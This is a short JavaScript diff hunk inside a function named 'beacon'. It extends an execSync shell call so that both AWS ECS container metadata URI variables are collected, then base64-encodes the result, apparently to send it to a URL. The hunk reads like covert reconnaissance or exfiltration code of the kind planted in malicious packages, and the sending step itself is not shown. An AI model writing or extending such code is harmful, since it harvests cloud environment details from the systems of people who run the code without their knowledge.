@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'echo "$ECS_CONTAINER_METADATA_URI"',
+  'echo "$ECS_CONTAINER_METADATA_URI" "$ECS_CONTAINER_METADATA_URI_V4"',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
